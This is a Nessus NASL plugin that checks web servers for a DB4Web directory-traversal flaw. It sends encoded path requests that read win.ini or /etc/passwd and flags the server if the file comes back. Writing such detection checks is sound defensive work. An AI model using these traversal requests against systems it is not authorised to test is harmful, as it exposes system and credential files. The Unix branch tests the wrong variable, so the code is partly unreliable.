# The script was written by Michel Arboi <arboi@alussinan.org>
# GNU Public Licence
#
# References:
#
# From:Stefan.Bagdohn@guardeonic.com
# To:vulnwatch@vulnwatch.org 
# Date: Thu, 19 Sep 2002 11:00:55 +0200
# Subject: Advisory: File disclosure in DB4Web
#

if(description)
{
 script_id(11182);
 script_version ("$Revision: 1.15 $");
  
 name["english"] = "DB4Web directory traversal";
 script_name(english:name["english"]);
 
 desc["english"] = "It is possible to read any file on your 
system through the DB4Web software.

Solution : Upgrade your software.

Risk factor : High";


 desc["francais"] = "Il est possible de lire n'importe quel 
fichier via le logiciel DB4Web

Solution : Mettez à jour votre logiciel 

Facteur de risque : Elevé";




 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Read any file through DB4Web";
 summary["francais"] = "Lit n'importe quel fichier via DB4Web";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi",
		francais:"Ce script est Copyright (C) 2002 Michel Arboi");	

 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 	

 script_dependencie("find_service.nes", "no404.nasl", "httpver.nasl",
                    "http_version.nasl", 
                    "webmirror.nasl", "DDI_Directory_Scanner.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if (! get_port_state(port)) exit(0);

cgis = get_kb_list("www/" + port + "/cgis");
if (isnull(cgis)) exit(0);
# cgis = make_list(cgis);

k = string("www/no404/", port);
qc=1;
if (get_kb_item(k)) qc=0;

n = 0;
foreach cgi (cgis)
{
  if ("/db4web_c.exe/" >< cgi)
  {
    # Windows
    end = strstr(cgi, "/db4web_c.exe/");
    dir = cgi - end;
    u = strcat(dir, "/db4web_c.exe/c%3A%5Cwindows%5Cwin.ini");
    if (check_win_dir_trav_ka(port: port, url: u))
    {
      security_hole(port);
      exit(0);
    }
    u = strcat(dir, "/db4web_c.exe/c%3A%5Cwinnt%5Cwin.ini");
    if (check_win_dir_trav_ka(port: port, url: u))
    {
      security_hole(port);
      exit(0);
    }
    n ++;
  }
  else if ("/db4web_c/" >< dir)
  {
    # Unix
    end = strstr(cgi, "/db4web_c/");
    dir = cgi - end;
    u = strcat(dir, "/db4web_c//etc/passwd");
    req = http_get(port: port, item: u);
    r = http_keepalive_send_recv(port:port, data:req);
    if( r == NULL )exit(0);
    if ("root:" >< r)
    {
      security_hole(port);
      exit(0);
    }
    n ++;
  }
}

